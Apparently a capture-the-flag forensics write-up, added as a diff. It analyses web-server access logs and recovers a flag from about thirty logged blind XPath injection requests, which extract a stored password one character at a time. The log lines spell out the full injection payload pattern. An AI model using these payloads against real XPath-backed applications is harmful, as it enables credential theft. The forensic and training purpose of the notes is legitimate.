@@ -1,0 +1,46 @@
+- looking for several important words: password, user, username ...
+- you can see in the logs nikto, nmap and other scans against the target
+- flew over a few scans
+- searching only for 200 responses (no 40x)
+- /etc/passwd seems like false positives, you can see that the response size for all index.php GETs is the same (size is behind the response code) -> probably normal index.php size
+- saw some kind of password calculation
+- looked for the flag specific signs and found them (CSCS{} in hex)
+  - those signs were only by the response size of 1373, so filtering the others out
+  - the signs were only at the last entry of substring section
+  - filtering out all last lines:
+
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[string-length(.)>32]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,1,1)>\"%43\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,2,1)>\"%53\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,3,1)>\"%43\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,4,1)>\"%47\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,5,1)>\"%7b\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,6,1)>\"%54\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,7,1)>\"%65\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,8,1)>\"%6d\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:00 +0100] "GET /?type=\"]%20|%20//Password[substring(.,9,1)>\"%70\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,10,1)>\"%65\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,11,1)>\"%73\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,12,1)>\"%74\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,13,1)>\"%47\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,14,1)>\"%72\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,15,1)>\"%61\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,16,1)>\"%76\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,17,1)>\"%69\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,18,1)>\"%74\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,19,1)>\"%61\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,20,1)>\"%74\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,21,1)>\"%69\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,22,1)>\"%6f\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:01 +0100] "GET /?type=\"]%20|%20//Password[substring(.,23,1)>\"%6e\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,24,1)>\"%4c\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,25,1)>\"%65\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,26,1)>\"%74\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,27,1)>\"%74\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,28,1)>\"%75\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,29,1)>\"%63\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,30,1)>\"%65\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+192.168.187.128 - - [22/Mar/2022:22:12:02 +0100] "GET /?type=\"]%20|%20//Password[substring(.,31,1)>\"%7d\"]%20|%20//*[@Random=\" HTTP/1.1" 200 1373 "-" "curl/7.68.0"
+
+  - throw the hex values into a hex to ascii converter and found the flag: CSCG{TempestGravitationLettuce}
+  - probably this a passwort calculation on the base of a vuln, were you see a positive response if you guess a correct char
